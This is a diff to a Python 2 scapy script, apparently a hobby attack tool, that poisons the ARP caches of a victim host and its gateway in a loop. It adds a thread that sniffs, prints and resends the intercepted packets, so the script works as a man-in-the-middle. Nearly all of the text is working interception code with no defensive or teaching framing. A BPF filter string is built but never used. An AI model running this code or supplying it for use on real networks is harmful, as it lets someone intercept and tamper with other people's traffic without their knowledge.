@@ -42,21 +42,27 @@ class Attack_Thread(threading.Thread, ):
     def __init__(self,):
         self.vIP, self.gIP = tuple(raw_input("pls enter " + x + " ") for x in ["victimIP", "gateIP"])
         self.arp_table = {ip: Attack_Thread.get_mac(ip) for ip in [self.vIP,self.gIP]}     
+        self.stop = threading.Event() #used for closing thread and sub threads cleanly
         super(Attack_Thread, self).__init__()
 
     def close(self,):
-        self.on = False
+        self.stop.clear() 
         sp.send(sp.ARP(op=REPLAY, pdst=self.gIP, psrc=self.vIP, hwdst=BROADCAST,
                     hwsrc=self.arp_table[self.vIP],), count=7)
         sp.send(sp.ARP(op=REPLAY, pdst=self.vIP, psrc=self.gIP, hwdst=BROADCAST,
                     hwsrc=self.arp_table[self.gIP],), count=7)
-        Attack_Thread.set_ip_forward(0)
+        self.sniffer.join()
+
     def run(self, ):
-        self.on = True
+        self.stop.set()
         try:
+            bpf_filter = " or ".join(map(lambda x: "(src host %s and dst host %s)" %x,  map(lambda x: tuple(self.arp_table.keys()[::x]), [-1,1])))
+            self.sniffer = Mitm_Thread(self.stop, bpf_filter)
+            self.sniffer.start()
             self.spoof()
         finally:
             self.close()
+
 
     def spoof(self,):
         """
@@ -64,15 +70,33 @@ class Attack_Thread(threading.Thread, ):
         returns: None
         tells the target you are the gateway and the gateway that you are the target
         """
-        Attack_Thread.set_ip_forward(1)
-        while self.on:
+        #Attack_Thread.set_ip_forward(1)
+        while self.stop.wait(0):
             sp.send(sp.ARP(op=REPLAY, pdst=self.vIP, psrc=self.gIP, hwdst=self.arp_table[self.vIP]))
             sp.send(sp.ARP(op=REPLAY, pdst=self.gIP, psrc=self.vIP, hwdst=self.arp_table[self.gIP]))
-            time.sleep(Attack_Thread.TIMEOUT)
-class mitm_thread(threading.Thread):
+            time.sleep(Attack_Thread.TIMEOUT)#refresh the targets arp cache every timeout
+
+class Mitm_Thread(threading.Thread):
+    """
+    This  thread is used for sniffing the packets 
+    and then forwarding them + modfying them
+    """
+    def __init__(self, stop, bpf_filter):
+        self.stop = stop
+        self.bpf_filter = bpf_filter
+        super(Mitm_Thread, self).__init__()
+
+    def run(self, ):
+        while self.stop.wait(0):
+            sp.sniff(timeout=0.2, prn=self.pkt_handler)
+    
+    def pkt_handler(self, pkt):
+        print pkt.summary()
+        sp.send(pkt)
+        
 
 a = Attack_Thread()
-a.run()
+a.start()
 raw_input()
 a.close()
 
